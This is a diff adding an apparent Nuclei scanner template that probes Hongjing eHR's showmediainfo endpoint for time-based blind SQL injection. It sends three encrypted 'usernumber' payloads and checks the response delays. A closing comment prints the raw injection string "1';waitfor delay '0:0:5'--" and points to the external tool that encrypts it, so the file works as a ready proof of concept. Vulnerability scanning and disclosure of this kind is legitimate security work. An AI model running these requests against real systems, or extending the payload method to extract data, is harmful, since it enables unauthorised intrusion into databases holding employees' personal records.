@@ -1,0 +1,44 @@
+id: hongjing-showmediainfo-sqli
+info:
+  name: hongjing-showmediainfo-sqli
+  author: apple
+  severity: high
+  description: 宏景eHR人力资源管理软件showmediainfo存在SQL注入漏洞.出现问题的参数为usernumber，参数需要加密。具体看本文件。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPU95aS1iImic1iq20CG0s9APAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      - |
+        GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPaRZJpCZEpUlWj2w12PVFssPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      - |
+        GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPbaa206vp7EsxZM3Fv3rwRAPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
+#加密工具：https://github.com/vaycore/HrmsTool/releases/tag/0.1 
+#java -jar HrmsTool.jar -e "1';waitfor delay '0:0:5'--"
